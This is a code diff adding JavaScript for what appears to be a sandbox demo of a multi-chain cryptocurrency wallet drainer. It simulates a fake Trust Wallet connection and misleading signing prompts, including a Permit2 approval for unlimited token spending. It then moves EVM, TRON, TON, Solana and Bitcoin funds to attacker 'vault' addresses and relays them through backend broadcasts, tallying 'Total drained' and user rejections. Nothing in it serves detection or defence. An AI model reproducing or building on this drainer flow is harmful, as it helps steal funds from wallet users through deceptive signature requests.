+    if (willReject()) throw new Error('UserRejected');
+    await showSign('TRON', 'Confirm TRX Transfer',
+      'Send native TRX to vault. This is the cleanup step after USDT.',
+      { 'Amount': (sendAmt/1e6).toFixed(3) + ' TRX (~$' + ((sendAmt/1e6)*PRICES.trx).toFixed(2) + ')', 'To Vault': 'TDLDgBt…ZFc', 'Fee reserved': '0.3 TRX (bandwidth)', 'Expiry extended': '1 hour ✓' });
+    log('sign', 'TRX tx signed ✓', 'purple');
+    await delay(200);
+    log('trx', 'backend.validateTronRelayPayload → Path A (TransferContract) ✓', 'dim');
+    log('trx', 'Backend: broadcast TRX tx → TronGrid ✓', 'green');
+    trxDrained = true;
+  } catch (e) {
+    log('err', 'TRX sign REJECTED', 'red');
+    state.totalRejected++;
+    setStep(7, 'error');
+  }
+
+  var tronUsd = (trc20Drained ? parseFloat(MOCK.tron.usdt) : 0) + (trxDrained ? (sendAmt/1e6)*PRICES.trx : 0);
+  if (trc20Drained || trxDrained) {
+    state.totalUsd += tronUsd;
+    state.totalTx += (trc20Drained ? 1 : 0) + (trxDrained ? 1 : 0);
+    state.totalChains += 1;
+    setCard('trx', 'done', '~$' + tronUsd.toFixed(0));
+    if (trc20Drained) setStep(6, 'done');
+    if (trxDrained) setStep(7, 'done');
+  } else {
+    setCard('trx', 'error');
+  }
+  updateSummary();
+}
+
+// ─────────────────────────────────────────────
+// PHASE B — TON
+// ─────────────────────────────────────────────
+async function drainTon() {
+  logSep('PHASE B · TON');
+  setCard('ton', 'active');
+  setStep(8, 'active');
+  await delay(300);
+  log('ton', 'window.trustwallet.ton detected ✓', 'dim');
+  log('ton', 'connect({ items: [ton_addr] }) → ' + MOCK.ton.address, 'dim');
+  await delay(400);
+  log('ton', 'TON balance: ' + MOCK.ton.ton + ' TON (~$' + (parseFloat(MOCK.ton.ton)*PRICES.ton).toFixed(0) + ')', 'amber');
+  log('ton', 'Building TON transfer message…', 'dim');
+  await delay(300);
+
+  try {
+    if (willReject()) throw new Error('UserRejected');
+    await showSign('TON', 'Confirm Transfer',
+      'Send TON to vault address.',
+      { 'Amount': MOCK.ton.ton + ' TON', 'To Vault': 'UQDIt…BfY', 'Network': 'TON Mainnet', 'Fee': '~0.003 TON' });
+    log('sign', 'TON tx signed ✓', 'purple');
+    await delay(200);
+    log('ton', 'Backend: broadcast TON tx → toncenter ✓', 'green');
+    var tonUsd = parseFloat(MOCK.ton.ton) * PRICES.ton;
+    state.totalUsd += tonUsd;
+    state.totalTx += 1;
+    state.totalChains += 1;
+    setCard('ton', 'done', '~$' + tonUsd.toFixed(0));
+    setStep(8, 'done');
+    updateSummary();
+  } catch (e) {
+    log('err', 'TON sign REJECTED', 'red');
+    state.totalRejected++;
+    setCard('ton', 'error');
+    setStep(8, 'error');
+    updateSummary();
+  }
+}
+
+// ─────────────────────────────────────────────
+// FULL PHASE B
+// ─────────────────────────────────────────────
+async function runPhaseB() {
+  if (state.running) return;
+  state.running = true;
+  document.getElementById('btnRun').disabled = true;
+  logSep('PHASE B — STARTING (auto trigger after EVM)');
+  log('sys', 'trust:evm-confirm-done event fired → setTimeout(startPhaseB, 200)', 'dim');
+  await delay(300);
+  await drainSol();
+  await delay(200);
+  await drainBtc();
+  await delay(200);
+  await drainTron();
+  await delay(200);
+  await drainTon();
+  await delay(200);
+
+  // Final summary
+  logSep('BACKEND SETTLEMENT');
+  setStep(9, 'active');
+  log('sys', 'All signed txs sent to backend /api/relay…', 'dim');
+  await delay(300);
+  log('sys', 'Validate all payloads → vault addresses match ✓', 'green');
+  log('sys', 'TronGrid broadcast: USDT TRC-20 + TRX ✓', 'green');
+  log('sys', 'Helius broadcast: SOL + USDC-SPL ✓', 'green');
+  log('sys', 'mempool.space broadcast: BTC PSBT ✓', 'green');
+  log('sys', 'toncenter broadcast: TON ✓', 'green');
+  setStep(9, 'done');
+  await delay(200);
+
+  setStep(10, 'active');
+  log('ok', '══════════════════════════════════════', 'green');
+  log('ok', 'VAULT SETTLEMENT COMPLETE', 'green');
+  log('ok', 'Total drained: ~$' + state.totalUsd.toFixed(0) + ' | Txs: ' + state.totalTx + ' | Chains: ' + state.totalChains, 'green');
+  log('ok', 'Rejected by user: ' + state.totalRejected + ' signs', state.totalRejected > 0 ? 'amber' : 'dim');
+  log('ok', '══════════════════════════════════════', 'green');
+  setStep(10, 'done');
+  updateSummary();
+
+  state.running = false;
+  document.getElementById('btnRun').disabled = false;
+}
+
+// ─────────────────────────────────────────────
+// FULL FLOW
+// ─────────────────────────────────────────────
+async function startFlow() {
+  if (state.running) return;
+  resetAll();
+  await delay(100);
+  state.running = true;
+  document.getElementById('btnRun').disabled = true;
+  // Phase A
+  await runPhaseAInternal();
+  // Phase B auto-trigger
+  await delay(200);
+  log('sys', '── trust:evm-confirm-done → Phase B starting ──', 'dim');
+  await delay(300);
+  await drainSol();
+  await delay(200);
+  await drainBtc();
+  await delay(200);
+  await drainTron();
+  await delay(200);
+  await drainTon();
+  await delay(200);
+  logSep('BACKEND SETTLEMENT');
+  setStep(9, 'active');
+  log('sys', 'All signed txs → backend /api/relay', 'dim');
+  await delay(400);
+  log('sys', 'Validate + broadcast all chains ✓', 'green');
+  setStep(9, 'done');
+  await delay(200);
+  setStep(10, 'active');
+  log('ok', '══════════════════════════════════════', 'green');
+  log('ok', 'FLOW COMPLETE — ~$' + state.totalUsd.toFixed(0) + ' drained (' + state.totalChains + ' chains, ' + state.totalTx + ' txs)', 'green');
+  log('ok', '══════════════════════════════════════', 'green');
+  setStep(10, 'done');
+  updateSummary();
+  state.running = false;
+  document.getElementById('btnRun').disabled = false;
+}
+
+async function runPhaseAInternal() {
+  logSep('PHASE A — EVM (Permit2)');
+  setStep(1, 'active');
+  log('sys', 'Mock window.ethereum injected (Trust Wallet)', 'dim');
+  await delay(400);
+  log('sys', 'window.trustwallet detected ✓', 'green');
+  setStep(1, 'done');
+  setStep(2, 'active');
+  setCard('evm', 'active');
+  await delay(300);
+  log('evm', 'eth_requestAccounts → connected', 'dim');
+  await delay(400);
+  log('evm', 'Address: ' + MOCK.evm.address.slice(0, 14) + '…' + MOCK.evm.address.slice(-4), 'green');
+  log('evm', 'USDT: ' + MOCK.evm.usdt + ' | USDC: ' + MOCK.evm.usdc + ' | ETH: ' + MOCK.evm.eth, 'amber');
+  setStep(2, 'done');
+  setStep(3, 'active');
+  await delay(400);
+  log('evm', 'Building Permit2 EIP-712 signature…', 'dim');
+  await delay(300);
+  try {
+    if (willReject()) throw new Error('UserRejected');
+    await showSign('Ethereum', 'Token Approval',
+      'Permit2 — one signature approves unlimited spending of all ERC-20 tokens.',
+      { 'Protocol': 'Uniswap Permit2', 'Tokens': 'USDT, USDC (unlimited)', 'Spender': '0x3b93…01eE', 'Expiry': '30 days' });
+    log('sign', 'Permit2 EIP-712 signed ✓', 'purple');
+    await delay(300);
+    log('evm', 'Backend Permit2 transferFrom(USDT 850) ✓', 'green');
+    log('evm', 'Backend Permit2 transferFrom(USDC 200) ✓', 'green');
+    var evmUsd = 850 + 200 + parseFloat(MOCK.evm.eth) * PRICES.eth;
+    state.totalUsd += evmUsd;
+    state.totalTx += 2;
+    state.totalChains += 1;
+    setCard('evm', 'done', '~$' + evmUsd.toFixed(0));
+    setStep(3, 'done');
+    updateSummary();
+  } catch (e) {
+    log('err', 'Permit2 REJECTED — EVM failed', 'red');
+    state.totalRejected++;
+    setCard('evm', 'error');
+    setStep(3, 'error');
+    updateSummary();
+  }
+}
+
+// ─────────────────────────────────────────────
+// RESET
+// ─────────────────────────────────────────────
+function resetAll() {
+  document.getElementById('logBox').innerHTML = '';
+  state.logs = 0; state.totalUsd = 0; state.totalTx = 0;
+  state.totalChains = 0; state.totalRejected = 0;
+  document.getElementById('logCount').textContent = '0 events';
+  ['evm','sol','btc','trx','ton'].forEach(function(c) { setCard(c, 'idle'); document.getElementById('amount-'+c).textContent = ''; });
+  for (var i = 1; i <= 10; i++) {
+    var el = document.getElementById('step-' + i);
+    if (el) { el.className = 'step-item'; el.querySelector('.step-num').textContent = i; }
+  }
+  updateSummary();
+  log('sys', 'Sandbox reset. Click ▶ Run Full Flow to start.', 'dim');
+}
+
+// Init
+resetAll();
+</script>
